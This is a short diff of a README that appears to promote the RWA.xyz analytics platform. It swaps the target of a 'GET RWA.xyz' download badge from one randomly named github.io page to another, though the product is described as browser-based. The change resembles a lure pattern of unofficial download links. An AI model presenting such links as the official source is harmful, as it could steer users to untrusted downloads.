@@ -53,7 +53,7 @@ For analysts, builders, and institutional researchers, RWA.xyz analytics can red
 
 Prerequisites: A modern web browser, a stable internet connection, and a clear research goal for reviewing real-world asset markets, tokenized asset activity, or API-based data workflows.
 
-[![GET RWA.xyz](https://img.shields.io/badge/GET%20%E2%80%94%20RWA.xyz-0078D6?style=for-the-badge&logoColor=white)](https://vancehudsonazuw.github.io/.github/rwa-xyz-data)
+[![GET RWA.xyz](https://img.shields.io/badge/GET%20%E2%80%94%20RWA.xyz-0078D6?style=for-the-badge&logoColor=white)](https://noeljaramillovurz.github.io/.github/rwa-xyz-data)
 
 1.  **Open the Platform:** Visit RWA.xyz website and begin with the main market overview to understand how RWA.xyz data is organized.
 2.  **Choose a Research Angle:** Use RWA.xyz dashboard to focus on asset class, issuer, blockchain network, or market segment before comparing results.
